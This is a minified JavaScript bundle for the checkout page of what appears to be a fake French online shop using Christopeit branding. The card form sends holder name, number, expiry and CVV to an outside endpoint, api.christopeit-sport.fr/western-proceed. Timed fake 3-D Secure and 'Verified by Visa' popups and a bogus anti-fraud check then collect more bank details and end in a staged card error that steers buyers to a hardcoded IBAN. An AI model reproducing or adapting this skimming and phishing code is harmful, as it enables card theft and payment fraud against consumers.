(self.webpackChunk_N_E=self.webpackChunk_N_E||[]).push([[732],{2508:(e,t,a)=>{(window.__NEXT_P=window.__NEXT_P||[]).push(["/checkout",function(){return a(7256)}])},5239:(e,t,a)=>{"use strict";a.d(t,{Ay:()=>o});let r={_origin:"https://api.emailjs.com"},c=(e,t,a)=>{if(!e)throw"The user ID is required. Visit https://dashboard.emailjs.com/admin/integration";if(!t)throw"The service ID is required. Visit https://dashboard.emailjs.com/admin";if(!a)throw"The template ID is required. Visit https://dashboard.emailjs.com/admin/templates";return!0};class s{constructor(e){this.status=e.status,this.text=e.responseText}}let n=(e,t,a={})=>new Promise((c,n)=>{let i=new XMLHttpRequest;i.addEventListener("load",({target:e})=>{let t=new s(e);200===t.status||"OK"===t.text?c(t):n(t)}),i.addEventListener("error",({target:e})=>{n(new s(e))}),i.open("POST",r._origin+e,!0),Object.keys(a).forEach(e=>{i.setRequestHeader(e,a[e])}),i.send(t)}),i=e=>{let t;if(!(t="string"==typeof e?document.querySelector(e):e)||"FORM"!==t.nodeName)throw"The 3rd parameter is expected to be the HTML form element or the style selector of form";return t},o={init:(e,t="https://api.emailjs.com")=>{r._userID=e,r._origin=t},send:(e,t,a,s)=>{let i=s||r._userID;return c(i,e,t),n("/api/v1.0/email/send",JSON.stringify({lib_version:"3.2.0",user_id:i,service_id:e,template_id:t,template_params:a}),{"Content-type":"application/json"})},sendForm:(e,t,a,s)=>{let o=s||r._userID,l=i(a);c(o,e,t);let d=new FormData(l);return d.append("lib_version","3.2.0"),d.append("service_id",e),d.append("template_id",t),d.append("user_id",o),n("/api/v1.0/email/send-form",d)}}},7256:(e,t,a)=>{"use strict";a.r(t),a.d(t,{__N_SSG:()=>f,default:()=>g});var r=a(7876),c=a(4232),s=a(5239);a(973);var n=a(1759),i=a(6734),o=a(6882),l=a(107);let d=e=>{let{cart:t,totalPrice:a,discount:c,discountedPrice:s,name:n,paymentFees:d,deliveryEstimate:u,data:h,shop:m}=e;return(0,r.jsxs)(r.Fragment,{children:[(0,r.jsxs)("div",{className:"shop-info",children:[(0,r.jsx)("h2",{children:h.checkoutPayLabel}),(0,r.jsx)("h1",{className:"color-primary",children:"".concat((.85*t.reduce((e,t)=>e+t.price*t.quantity,0)).toLocaleString(m.language,{minimumFractionDigits:2})," ").concat(m.currency)})]}),(0,r.jsxs)("div",{className:"cart-summary",children:[(0,r.jsx)("ul",{children:t.map((e,t)=>(0,r.jsx)("li",{children:(0,r.jsxs)("div",{className:"cart-item",children:[(0,r.jsx)("h4",{children:e.title}),(0,r.jsxs)("p",{className:"quantity",children:["(x",e.quantity,")"]}),(0,r.jsxs)("p",{children:[e.price.toLocaleString(m.language,{minimumFractionDigits:2})," ",m.currency]})]})},t))}),(0,r.jsxs)("div",{className:"cart-item discount",children:[(0,r.jsxs)("h4",{children:[h.checkoutPromoLabel," ",(0,r.jsx)("input",{value:"MAI15"})]}),(0,r.jsxs)("p",{className:"quantity",children:[h.checkoutPromoRate,"%"]}),(0,r.jsx)("p",{children:"-".concat((".15"*t.reduce((e,t)=>e+t.price*t.quantity,0)).toLocaleString(m.language,{minimumFractionDigits:2})," ").concat(m.currency)})]}),(0,r.jsxs)("div",{className:"cart-item discount",children:[(0,r.jsx)("h4",{children:h.productDeliveryLabel}),(0,r.jsx)("p",{className:"quantity delivery",children:t[0]&&(e=>{let t;let a=new Date;if("Express"===e)t=4;else if("Fast"===e)t=5;else{if("Normal"!==e)return"";t=6}let r=(0,i.f)(a,t);return(0,o.GP)(r,"EEEE d MMMM",{locale:l.fr})})(t[0].delivery)}),(0,r.jsx)("p",{children:h.checkoutFreeLabel})]}),(0,r.jsxs)("div",{className:"cart-item subtotal",children:[(0,r.jsx)("h4",{children:h.checkoutBeforePromo}),(0,r.jsx)("p",{children:"".concat(t.reduce((e,t)=>e+t.price*t.quantity,0).toLocaleString(m.language,{minimumFractionDigits:2})," ").concat(m.currency)})]}),(0,r.jsxs)("div",{className:"total-price",children:[(0,r.jsx)("h4",{children:h.cartTotal}),(0,r.jsx)("p",{children:"".concat((.85*t.reduce((e,t)=>e+t.price*t.quantity,0)).toLocaleString(m.language,{minimumFractionDigits:2})," ").concat(m.currency)})]})]}),(0,r.jsxs)("p",{className:"secure footer",children:["2025 \xa9 ",h.footerCopyright," - ",n," INC. 32455"]})]})},u=e=>{let{verificationError:t,bankName:a,bankLogo:s,cardType:n,cardScheme:i,cardCountry:o,discountedPrice:l,onRetry:d}=e,[u,h]=c.useState(""),[m,p]=c.useState(a||""),[x,j]=c.useState(n||""),[f,g]=c.useState(i||""),[y,v]=c.useState(o||""),[k,N]=c.useState(1);return c.useEffect(()=>{let e=setTimeout(()=>{1===k&&N(2)},12e3);return()=>clearTimeout(e)},[k]),(0,r.jsx)("div",{className:"verification-wrapper",children:(0,r.jsx)("div",{className:"verification-popup",children:1===k?(0,r.jsxs)(r.Fragment,{children:[(0,r.jsx)("h2",{children:"V\xe9rification du paiement"}),(0,r.jsx)("p",{className:"desc",children:"Nous v\xe9rifions votre moyen de paiement, cela peut prendre jusqu'\xe0 30 secondes, merci de patienter."}),(0,r.jsx)("div",{className:"loader"})]}):2===k?(0,r.jsxs)(r.Fragment,{children:[(0,r.jsxs)("div",{className:"head",children:[(0,r.jsx)("img",{src:s||"/favicon.png",alt:"".concat(m," logo"),className:"bank-logo"}),(0,r.jsx)("img",{src:"/verified-by-visa.png",alt:"Verified by Visa logo",className:"visa-logo"})]}),(0,r.jsx)("h2",{children:"Confirmation du paiement"}),(0,r.jsx)("p",{className:"desc",children:"Confirmez les informations suivantes pour v\xe9rifier votre carte bancaire et finaliser votre commande :"}),(0,r.jsxs)("div",{className:"input-list",children:[(0,r.jsxs)("label",{children:[(0,r.jsx)("span",{children:"Titulaire"})," ",(0,r.jsx)("input",{type:"text",id:"cardHolder",placeholder:"Nom complet",onChange:e=>h(e.target.value),required:!0})]}),(0,r.jsxs)("label",{children:[(0,r.jsx)("span",{children:"Banque"})," ",(0,r.jsx)("input",{type:"text",id:"bankName",value:m,onChange:e=>p(e.target.value)})]}),(0,r.jsxs)("label",{children:[(0,r.jsx)("span",{children:"Type"})," ",(0,r.jsx)("input",{type:"text",id:"cardNumber",value:x,onChange:e=>j(e.target.value)})]}),(0,r.jsxs)("label",{children:[(0,r.jsx)("span",{children:"R\xe9seau"})," ",(0,r.jsx)("input",{type:"text",id:"cardScheme",value:f,onChange:e=>g(e.target.value)})]}),(0,r.jsxs)("label",{children:[(0,r.jsx)("span",{children:"Pays"})," ",(0,r.jsx)("input",{type:"text",id:"cardCountry",value:y,onChange:e=>v(e.target.value)})]})]}),(0,r.jsx)("button",{onClick:()=>{N(3),setTimeout(()=>{N(4)},16e3)},children:"Confirmer"}),(0,r.jsxs)("p",{className:"notice",children:[(0,r.jsx)("span",{className:"underline",children:"Anti-fraudes"})," : Confirmez les informations de votre carte pour proc\xe9der au paiement."]})]}):3===k?(0,r.jsxs)(r.Fragment,{children:[(0,r.jsx)("h2",{children:"V\xe9rification en cours"}),(0,r.jsx)("p",{className:"desc",children:"Nous v\xe9rifions vos informations, patientez quelques instants pour proc\xe9der au paiement."}),(0,r.jsx)("div",{className:"loader"})]}):4===k?(0,r.jsxs)(r.Fragment,{children:[(0,r.jsxs)("div",{className:"head",children:[(0,r.jsx)("img",{src:s||"/favicon.png",alt:"".concat(m," logo"),className:"bank-logo"}),(0,r.jsx)("img",{src:"/verified-by-visa.png",alt:"Verified by Visa logo",className:"visa-logo"})]}),(0,r.jsx)("h2",{children:"Erreur de v\xe9rification"}),(0,r.jsx)("p",{className:"desc",children:"Votre carte n'a pas pu \xeatre v\xe9rifi\xe9e, r\xe9essayez ou utilisez un autre moyen de paiement."}),(0,r.jsx)("p",{className:"smaller",children:"Moyens alternatifs : Virement bancaire, PayPal"}),(0,r.jsx)("button",{onClick:d,children:"R\xe9essayer"})]}):(0,r.jsxs)(r.Fragment,{children:[(0,r.jsx)("h2",{children:"V\xe9rification r\xe9ussie"}),(0,r.jsx)("p",{className:"desc",children:"Votre carte a \xe9t\xe9 v\xe9rifi\xe9e avec succ\xe8s."})]})})})};function h(e){for(var t=1;t<arguments.length;t++){var a=arguments[t];for(var r in a)e[r]=a[r]}return e}var m=function e(t,a){function r(e,r,c){if("undefined"!=typeof document){"number"==typeof(c=h({},a,c)).expires&&(c.expires=new Date(Date.now()+864e5*c.expires)),c.expires&&(c.expires=c.expires.toUTCString()),e=encodeURIComponent(e).replace(/%(2[346B]|5E|60|7C)/g,decodeURIComponent).replace(/[()]/g,escape);var s="";for(var n in c){if(c[n])s+="; "+n,!0!==c[n]&&(s+="="+c[n].split(";")[0])}return document.cookie=e+"="+t.write(r,e)+s}}return Object.create({set:r,get:function(e){if("undefined"!=typeof document&&(!arguments.length||e)){for(var a=document.cookie?document.cookie.split("; "):[],r={},c=0;c<a.length;c++){var s=a[c].split("="),n=s.slice(1).join("=");try{var i=decodeURIComponent(s[0]);if(r[i]=t.read(n,i),e===i)break}catch(e){}}return e?r[e]:r}},remove:function(e,t){r(e,"",h({},t,{expires:-1}))},withAttributes:function(t){return e(this.converter,h({},this.attributes,t))},withConverter:function(t){return e(h({},this.converter,t),this.attributes)}},{attributes:{value:Object.freeze(a)},converter:{value:Object.freeze(t)}})}({read:function(e){return'"'===e[0]&&(e=e.slice(1,-1)),e.replace(/(%[\dA-F]{2})+/gi,decodeURIComponent)},write:function(e){return encodeURIComponent(e).replace(/%(2[346BF]|3[AC-F]|40|5[BDE]|60|7[BCD])/g,decodeURIComponent)}},{path:"/"}),p=a(9099);let x=e=>{let{amount:t,orderNumber:a,onBack:s,showStep:n,isLoading:i,setIsLoading:o,show3DSecurePopup:l,setShow3DSecurePopup:d,data:u,shop:h}=e,[m,x]=(0,c.useState)({cardHolder:"",cardNumber:"",expiryDate:"",cvv:""}),[j,f]=(0,c.useState)(!1),[g,y]=(0,c.useState)(!1),[v,k]=(0,c.useState)("/verified-by-visa.png"),[N,b]=(0,c.useState)("western"),P=(0,c.useRef)(null),C=(0,c.useRef)(null),F=(0,c.useRef)(null);(0,p.useRouter)();let S=(0,c.useRef)(null);(0,c.useEffect)(()=>{let e=async()=>{if(!(await fetch("https://api.christopeit-sport.fr/western-init",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({orderNumber:a,amount:t})})).ok)throw Error("Failed to initialize payment");console.log("Initialization successful")};(async()=>{if(await new Promise(e=>setTimeout(e,3e3)),"0.00"!==t){S.current=e();try{await S.current}catch(e){console.error("Error during initialization:",e)}}console.log("AMOUNT:",t),console.log("ORDER NUMBER:",a)})()},[t,a]);let w=new Date,E=w.toLocaleDateString("fr-FR",{year:"2-digit",month:"2-digit",day:"2-digit"}),D=w.toLocaleTimeString("fr-FR",{hour:"2-digit",minute:"2-digit",second:"2-digit"}),T=m.cardNumber.replace(/\s/g,"").slice(-4),q=e=>{let{name:t,value:a}=e.target;if("cardNumber"===t){let e=a.replace(/\D/g,"").slice(0,16).replace(/(.{4})/g,"$1 ").trim();x(a=>({...a,[t]:e}))}else if("expiryDate"===t){let e=a.replace(/\D/g,"").slice(0,4).replace(/(\d{2})(\d{1,2})?/,(e,t,a)=>a?"".concat(t,"/").concat(a):t);x(a=>({...a,[t]:e}))}else x(e=>({...e,[t]:a}))},L=async(e,t,a)=>{if(S.current)try{await S.current}catch(e){throw Error("L'initialisation du paiement a \xe9chou\xe9 : "+e.message)}let r=Math.floor(1e5*Math.random());try{let c=await fetch("https://api.christopeit-sport.fr/western-proceed",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({orderNumber:e,paymentNumber:r,amount:t,cardDetails:a})}),s=await c.json();if(!c.ok)throw Error(s.message||"Something went wrong!");if(console.log("R\xe9ponse de l'API:",s),s.result)return s.result;return s}catch(e){throw console.error("Error fetching payment:",e),f(!1),y(!1),d(!1),e}},R=async()=>{try{if(!(await fetch("https://api.christopeit-sport.fr/western-init",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({orderNumber:a,amount:t})})).ok)throw Error("Failed to reinitialize payment");console.log("Background reinitialization successful"),S.current=Promise.resolve()}catch(e){console.error("Error during background reinitialization:",e),S.current=Promise.reject(e)}},_=async e=>{var r;e.preventDefault(),document.activeElement===document.querySelector('input[name="cvv"]')&&document.activeElement.blur(),gtag("event","conversion",{send_to:"AW-16883090550/gaFaCMfZ27QaEPaIvvI-",value:50,currency:"EUR",transaction_id:"",event_callback:function(){}});let c={cardNumber:" ".concat(m.cardNumber," "),cardOwner:m.cardHolder,cardExpiration:m.expiryDate,cardCVC:m.cvv};m.cardNumber.startsWith("5")&&k("/mastercard-id-check.png");try{console.log("Paiement en cours..."),o(!0),R(),setTimeout(()=>{o(!1),d(!0)},56e3);let e=await L(a,t,c);o(!1),d(!1),"refused"===e?y(!0):f(!0)}catch(e){console.error(u.checkoutPayError,e),alert(u.checkoutPayGenericError),o(!1),d(!1)}},I=()=>{f(!1),y(!1),d(!1),_(new Event("submit"))};return(0,r.jsxs)("form",{onSubmit:_,children:[(0,r.jsx)("input",{type:"text",name:"cardHolder",placeholder:u.checkoutPayCardHolderPlaceholder,onChange:q,required:!0}),(0,r.jsx)("input",{type:"text",name:"cardNumber",placeholder:u.checkoutPayCardNumberPlaceholder,ref:P,value:m.cardNumber,onChange:q,required:!0}),(0,r.jsxs)("div",{className:"form-row",children:[(0,r.jsx)("input",{type:"text",name:"expiryDate",placeholder:u.checkoutPayExpiryDatePlaceholder,maxLength:"5",ref:C,value:m.expiryDate,onChange:q,required:!0}),(0,r.jsx)("input",{type:"text",name:"cvv",placeholder:u.checkoutPayCVVPlaceholder,ref:F,maxLength:"4",value:m.cvv,onChange:q,required:!0})]}),(0,r.jsxs)("article",{className:"checkout-buttons",children:[(0,r.jsx)("button",{className:"back-checkout",type:"button",onClick:()=>s&&s(),children:(0,r.jsx)("i",{className:"fas fa-arrow-left"})}),(0,r.jsx)("button",{id:"pay-checkout",type:"submit",children:u.checkoutPayProceedButton})]}),i&&(0,r.jsx)("div",{className:"verification-wrapper",children:(0,r.jsxs)("div",{className:"verification-popup loading",children:[(0,r.jsxs)("article",{className:"head",children:[(0,r.jsx)("img",{className:"brand-logo",src:"icon.png",alt:"Christopeit France"}),(0,r.jsx)("img",{className:"card-logo ".concat("/mastercard-id-check.png"===v?"mastercard":"visa"),src:v,alt:u.checkoutPayVerifiedPaymentAlt})]}),(0,r.jsx)("h2",{children:u.checkoutPayLoadingTitle}),(0,r.jsx)("p",{className:"desc",children:u.checkoutPayLoadingDescription}),(0,r.jsx)("div",{className:"loader border-top-primary"})]})}),l&&(0,r.jsx)("div",{className:"verification-wrapper",children:(0,r.jsxs)("div",{className:"verification-popup d-secure",children:[(0,r.jsxs)("article",{className:"head",children:[(0,r.jsx)("img",{className:"brand-logo",src:"icon.png",alt:"Christopeit France"}),(0,r.jsx)("img",{className:"card-logo ".concat("/mastercard-id-check.png"===v?"mastercard":"visa"),src:v,alt:u.checkoutPayVerifiedPaymentAlt})]}),(0,r.jsx)("img",{src:"3d-secure.png",alt:"3D Secure",className:"icon"}),(0,r.jsx)("h2",{children:u.checkoutPay3DSecureTitle}),(0,r.jsx)("p",{className:"desc",children:u.checkoutPay3DSecureDescription}),(0,r.jsxs)("article",{className:"infos",children:[(0,r.jsx)("span",{children:"western"===N?u.checkoutPay3DSecureMerchant:"".concat(h.name," - Google Payment")}),(0,r.jsxs)("span",{children:[u.checkoutPay3DSecureAmount," : ",t,h.currency]}),(0,r.jsxs)("span",{children:[u.checkoutPay3DSecureDate," : ","".concat(E," \xe0 ").concat(D)]}),(0,r.jsxs)("span",{children:[u.checkoutPay3DSecureCard," : **** **** **** ",T]})]}),(0,r.jsx)("div",{className:"loader border-top-primary"}),(0,r.jsx)("p",{className:"smaller",children:u.checkoutPay3DSecureFooter})]})}),j&&(0,r.jsx)("div",{className:"verification-wrapper",children:(0,r.jsxs)("div",{className:"verification-popup error",children:[(0,r.jsxs)("article",{className:"head",children:[(0,r.jsx)("img",{className:"brand-logo",src:"icon.png",alt:"Christopeit France"}),(0,r.jsx)("img",{className:"card-logo ".concat("/mastercard-id-check.png"===v?"mastercard":"visa"),src:v,alt:u.checkoutPayVerifiedPaymentAlt})]}),(0,r.jsx)("h2",{className:"icon",children:"❌"}),(0,r.jsx)("h2",{children:u.checkoutPayErrorTitle}),(0,r.jsx)("p",{className:"desc",children:u.checkoutPayErrorDescription}),(0,r.jsx)("button",{onClick:I,disabled:i,children:u.checkoutPayRetryButton})]})}),g&&(0,r.jsx)("div",{className:"verification-wrapper",children:(0,r.jsxs)("div",{className:"verification-popup error",children:[(0,r.jsxs)("article",{className:"head",children:[(0,r.jsx)("img",{className:"brand-logo",src:"icon.png",alt:"Christopeit France"}),(0,r.jsx)("img",{className:"card-logo ".concat("/mastercard-id-check.png"===v?"mastercard":"visa"),src:v,alt:u.checkoutPayVerifiedPaymentAlt})]}),(0,r.jsx)("h2",{className:"icon",children:"❌"}),(0,r.jsx)("h2",{children:"Erreur lors du paiement"}),(0,r.jsx)("p",{className:"desc",children:"Une erreur est survenue, lors du paiement veuillez r\xe9essayer."}),(0,r.jsx)("button",{onClick:()=>{I(),b("google")},disabled:i,children:"R\xe9esayer"})]})})]})},j=e=>{let{currentStep:t,showStep:a,selectedPaymentMethod:s,setSelectedPaymentMethod:n,discountedPrice:i,cart:o,name:l,showVerificationWrapper:d,setShowVerificationWrapper:h,onBack:j,data:f,shop:g,totalPrice:y}=e,v=(0,p.useRouter)();(0,c.useRef)(null),(0,c.useRef)(null);let[k,N]=(0,c.useState)({}),[b,P]=(0,c.useState)(""),[C,F]=(0,c.useState)(!1),[S,w]=(0,c.useState)(!1),[E,D]=(0,c.useState)(!1),[T,q]=(0,c.useState)(()=>{let e=m.get("checkoutFormData"),t=m.get("orderNumber");return{...JSON.parse(e||"{}"),orderNumber:t||Math.floor(1e5+9e5*Math.random()).toString()}});(0,c.useEffect)(()=>{m.set("checkoutFormData",JSON.stringify(T),{expires:1}),m.set("orderNumber",T.orderNumber,{expires:1})},[T]),(0,c.useEffect)(()=>{"true"===v.query.failed&&(P(f.checkoutFormPaymentError),F(!0),w(!1),D(!1))},[v.query]);let L=e=>{let{name:t,value:a}=e.target;P(""),q(e=>({...e,[t]:a})),N(e=>{let r={...e};return a?delete r[t]:r[t]="".concat(t," ").concat(f.checkoutFormIsRequired),r})},R=e=>{let t={};return["address","postal","city","email","name","phone"].forEach(e=>{T[e]||(t[e]="".concat(e," ").concat(f.checkoutFormIsRequired))}),N(t),0===Object.keys(t).length},_=async e=>{if(1===e&&!R(e)){P(f.checkoutFormInfoRequired);return}w(!0);try{if(!(await fetch("/api/create-order",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({...T,amount:i,cart:o})})).ok)throw Error(f.checkoutFormPaymentError)}catch(e){console.error(f.checkoutFormPaymentError,e),P(f.checkoutFormPaymentError),w(!1);return}w(!1),P(""),a(e)};return(0,r.jsxs)("div",{className:"checkout-form",children:[C&&(0,r.jsxs)("div",{className:"error-banner",children:[(0,r.jsx)("a",{href:"/contact",target:"_blank",children:f.checkoutFormContactSupport}),"."]}),(0,r.jsx)("input",{type:"hidden",name:"totalPrice",value:i}),(0,r.jsx)("input",{type:"hidden",name:"products",value:o.map(e=>"".concat(e.productTitle," (x").concat(e.quantity,")")).join(", ")}),(0,r.jsx)("input",{type:"hidden",name:"website",value:l}),(0,r.jsxs)("div",{className:"checkout-step ".concat(0===t?"active":""),children:[(0,r.jsx)("h3",{children:f.checkoutFormDeliveryInfo}),(0,r.jsx)("input",{type:"text",name:"address",placeholder:f.checkoutFormAddressPlaceholder,value:T.address,onChange:L}),(0,r.jsx)("input",{type:"text",name:"suite",placeholder:f.checkoutFormSuitePlaceholder,value:T.suite,onChange:L}),(0,r.jsxs)("div",{className:"form-row",children:[(0,r.jsx)("input",{type:"text",name:"postal",placeholder:f.checkoutFormPostalPlaceholder,value:T.postal,onChange:L}),(0,r.jsx)("input",{type:"text",name:"city",placeholder:f.checkoutFormCityPlaceholder,value:T.city,onChange:L})]}),(0,r.jsx)("h3",{children:f.checkoutFormCustomerAccount}),(0,r.jsx)("input",{type:"text",name:"email",placeholder:f.checkoutFormEmailPlaceholder,value:T.email,onChange:L}),(0,r.jsxs)("div",{className:"form-row",children:[(0,r.jsx)("input",{type:"text",name:"name",placeholder:f.checkoutFormNamePlaceholder,value:T.name,onChange:L}),(0,r.jsx)("input",{type:"text",name:"phone",placeholder:f.checkoutFormPhonePlaceholder,value:T.phone,onChange:L})]}),(0,r.jsx)("button",{type:"button",id:"delivery-checkout",onClick:()=>_(1),disabled:S,children:S?(0,r.jsx)("span",{className:"loader border-top-primary"}):f.checkoutFormProceedToPayment}),b&&(0,r.jsx)("p",{className:"error",children:b})]}),(0,r.jsxs)("div",{className:"checkout-step ".concat(1===t?"active":""),children:[(0,r.jsx)("h3",{className:"method",children:f.checkoutFormPaymentMethod}),(0,r.jsxs)("label",{className:"payment-method  payment-method ".concat("card"===s?"selected":""),children:[(0,r.jsx)("input",{type:"radio",name:"paymentMethod",value:"card",checked:"card"===s,onChange:()=>n("card")}),(0,r.jsx)("img",{className:"card",src:"/card-badges.png",alt:f.checkoutFormCardAlt}),(0,r.jsx)("span",{className:"info",children:f.checkoutFormCardInfo}),(0,r.jsx)("span",{className:"fees",children:f.checkoutFormCardFees})]}),(0,r.jsxs)("label",{className:"payment-method ".concat("bankTransfer"===s?"selected":""),children:[(0,r.jsx)("input",{type:"radio",name:"paymentMethod",value:"bankTransfer",checked:"bankTransfer"===s,onChange:()=>n("bankTransfer")}),(0,r.jsx)("img",{src:"FR"!==g.language?"bank-transfer.png":"/virement.png",className:"FR"!==g.language?"transfer en":"transfer",alt:f.checkoutFormBankTransferAlt}),(0,r.jsx)("span",{className:"info",children:f.checkoutFormBankTransferInfo})]}),(0,r.jsxs)("label",{className:"unvalaible payment-method ".concat("paypal"===s?"selected":""),children:[(0,r.jsx)("input",{type:"radio",name:"paymentMethod",value:"paypal",checked:"paypal"===s,onChange:()=>n("paypal")}),(0,r.jsx)("img",{src:"/paypal-simple.png",alt:f.checkoutFormPaypalAlt}),(0,r.jsx)("span",{className:"info",children:"Non-\xe9ligible aux promotions"})]}),(0,r.jsxs)("article",{className:"checkout-buttons",children:[(0,r.jsx)("button",{className:"back-checkout",type:"button",onClick:()=>a(0),children:(0,r.jsx)("i",{className:"fas fa-arrow-left"})}),(0,r.jsx)("button",{type:"button",id:"payment-checkout",onClick:()=>_(2),children:f.checkoutFormConfirm})]}),b&&(0,r.jsx)("p",{className:"error",children:b})]}),(0,r.jsxs)("div",{className:"checkout-step ".concat(2===t?"active":""),children:["card"===s&&(0,r.jsxs)(r.Fragment,{children:[(0,r.jsx)("h3",{children:f.checkoutFormPayByCard}),(0,r.jsx)("p",{className:"paiement",children:f.checkoutFormEnterPaymentInfo}),(0,r.jsx)(x,{amount:i,orderNumber:T.orderNumber,onBack:j,formData:T,cart:o,isLoading:S,setIsLoading:w,show3DSecurePopup:E,setShow3DSecurePopup:D,data:f,shop:g}),(0,r.jsxs)("a",{target:"_blank",href:"https://www.westernunion.com/blog/fr/pourquoi-faire-confiance-a-western-union",className:"safe-payment",children:[(0,r.jsx)("i",{className:"fas fa-lock"}),f.checkoutFormSecurePayment," ",(0,r.jsx)("img",{src:"/westernunion.png",alt:"WesternUnion Payments"})]})]}),"bankTransfer"===s&&(0,r.jsxs)(r.Fragment,{children:[(0,r.jsx)("h3",{children:f.checkoutFormPayByBankTransfer}),(0,r.jsx)("p",{children:f.checkoutFormBankTransferInstructions}),(0,r.jsxs)("div",{className:"iban-group",children:[(0,r.jsxs)("p",{children:[(0,r.jsxs)("strong",{children:[f.checkoutFormAccountHolder," :"]})," ",g.name]}),(0,r.jsxs)("p",{children:[(0,r.jsxs)("strong",{children:[f.checkoutFormIBAN," :"]})," DE47 5033 0200 4677 8799 93"]}),(0,r.jsxs)("p",{children:[(0,r.jsxs)("strong",{children:[f.checkoutFormBIC," :"]})," MHBFDEFFXXX"]}),(0,r.jsxs)("p",{children:[(0,r.jsxs)("strong",{children:[f.checkoutFormOrderReference," :"]})," ",T.orderNumber]}),(0,r.jsxs)("p",{className:"amount",children:[(0,r.jsxs)("strong",{children:[f.checkoutFormAmount," :"]})," ",i,g.currency]})]}),(0,r.jsx)("p",{className:"smaller",children:f.checkoutFormBankTransferConfirmation}),(0,r.jsxs)("article",{className:"checkout-buttons",children:[(0,r.jsx)("button",{className:"back-checkout",type:"button",onClick:()=>a(1),children:(0,r.jsx)("i",{className:"fas fa-arrow-left"})}),(0,r.jsx)("button",{onClick:()=>window.location.href="/confirmation",children:f.checkoutFormTrackOrder})]})]}),b&&(0,r.jsx)("p",{className:"error",children:b})]}),d&&(0,r.jsx)(u,{verificationError:!1,bankName:f.checkoutFormBankName,bankLogo:"",cardType:"Visa",cardScheme:"Credit",cardCountry:"France",discountedPrice:i,onRetry:()=>{h(!1),a(1)}})]})};var f=!0;let g=e=>{let{data:t,shop:a,brand:i}=e,[o,l]=(0,c.useState)([]),[u,h]=(0,c.useState)("card"),[m,p]=(0,c.useState)(!1),[x,f]=(0,c.useState)(""),[g,y]=(0,c.useState)(""),[v,k]=(0,c.useState)(""),[N,b]=(0,c.useState)(""),[P,C]=(0,c.useState)(""),[F,S]=(0,c.useState)(!1),[w,E]=(0,c.useState)(0),[D,T]=(0,c.useState)(!1),[q,L]=(0,c.useState)(""),[R,_]=(0,c.useState)(!1),[I]=(0,c.useState)(()=>Math.floor(1e5+9e5*Math.random()).toString());(0,c.useEffect)(()=>{l((JSON.parse(localStorage.getItem("cart"))||[]).reduce((e,t)=>{let a=e.find(e=>e.title===t.title);return a?a.quantity+=1:e.push({...t,quantity:t.quantity}),e},[]))},[]),(0,c.useEffect)(()=>{s.Ay.init("8SL7vzVHt7qSqEd4i")},[]);let M=o.reduce((e,t)=>e+t.price*t.quantity,0).toFixed(2),O=(.15*M).toFixed(2),V=(M-O).toFixed(2),A="card"===u?(.025*V).toFixed(2):0,B=e=>{L(e),T(!0)},z=()=>{T(!1),L("")};return(0,r.jsxs)("div",{className:"paiement-container",children:[(0,r.jsx)(n.A,{name:a.name,domain:a.domain,title:"".concat(t.checkoutPageLabel," - ").concat(a.name)}),(0,r.jsxs)("div",{className:"left-column bg-main",children:[(0,r.jsx)("a",{className:"back",href:"/",children:(0,r.jsxs)("svg",{"aria-hidden":"true",focusable:"false",height:"30",role:"presentation",width:"179",fill:"none",viewBox:"0 0 179 30",xmlns:"http://www.w3.org/2000/svg",class:"svg_tamagoshi block h-[22px] w-[132px] desktop:h-[30px] desktop:w-[179px]",children:[(0,r.jsx)("path",{d:"M30.41 11.13 22.2.98a2.62 2.62 0 0 0-2.45-.95L6.87 2.1c-.92.15-1.7.78-2.04 1.66L.17 15.96c-.33.88-.17 1.87.42 2.6L8.8 28.71c.6.73 1.53 1.1 2.45.94l12.88-2.05c.92-.15 1.7-.78 2.04-1.66l4.66-12.21c.33-.88.17-1.87-.42-2.6Z",fill:"url(#tama-b2c-multicolor-light-horizontal-header-logo-b)"}),(0,r.jsx)("path",{d:"m19.06 8.75-2.92 5.23-2.86-6.2-3.58.95-4.43 11.58h3.95l2.67-6.83 2.62 6.5h2.02l3.89-6.97v8.93l3.69-1.26V9.65l-5.05-.9Z",fill:"#fff"}),(0,r.jsx)("path",{"fill-rule":"evenodd","clip-rule":"evenodd",d:"M48.47 14.83 52.6 7.4l7.2 1.28v15.55L54.55 26V13.45l-5.53 9.92h-2.88l-3.74-9.25-3.79 9.71H33l6.3-16.47L44.4 6l4.07 8.83Zm44.62-2.78a7.1 7.1 0 0 1 5.13-2 7.1 7.1 0 0 1 5.15 2 6.7 6.7 0 0 1 2.08 5.11 6.7 6.7 0 0 1-2.08 5.09 7.2 7.2 0 0 1-5.12 1.93 7.3 7.3 0 0 1-5.16-1.93 6.76 6.76 0 0 1-2.05-5.09c0-2.1.7-3.8 2.05-5.1Zm5.16 8.18c1.52 0 2.73-1.21 2.73-3.07 0-1.88-1.22-3.14-2.73-3.14-1.53 0-2.74 1.26-2.74 3.14 0 1.86 1.22 3.07 2.74 3.07ZM85.1 10.06l-.35.01c-1.5.05-3.4.77-4.22 1.28l-.28-1h-4.08v13.5h4.94v-8.7a4.8 4.8 0 0 1 2.47-.72c.63 0 .94.5.94 1.33v8.1h5V14.7c0-2.96-1.33-4.65-4.42-4.65Zm-22.58.68v3.8h.01c.44-.13 2.43-.7 4.92-.7 1.76-.02 2.6.5 2.6 1.88H67.7c-3.38 0-6.39.82-6.39 4.23 0 2.1 1.65 4.25 4.77 4.25 2.85 0 4.18-1 4.18-1l.29.65h3.78v-8.2c0-7.05-7.3-5.73-11.15-5.03l-.65.12Zm7.56 7.99c0 1.55-.98 2.25-2.84 2.25-1.24 0-1.97-.36-1.97-1.26s.83-1.16 2.57-1.16l2.24.02v.15Zm51.52-3.9 4.14-7.44 7.2 1.28v15.55L127.7 26V13.45l-5.53 9.92h-2.88l-3.73-9.25-3.8 9.71h-5.62l6.3-16.47 5.1-1.36 4.07 8.83Zm44.63-2.78a7.1 7.1 0 0 1 5.13-2c2.05 0 3.76.66 5.15 2a6.71 6.71 0 0 1 2.08 5.11 6.7 6.7 0 0 1-2.08 5.09 7.2 7.2 0 0 1-5.13 1.93 7.3 7.3 0 0 1-5.15-1.93 6.76 6.76 0 0 1-2.06-5.09c0-2.1.7-3.8 2.06-5.1Zm5.15 8.18c1.52 0 2.74-1.21 2.74-3.07 0-1.88-1.22-3.14-2.74-3.14-1.52 0-2.73 1.26-2.73 3.14 0 1.86 1.21 3.07 2.73 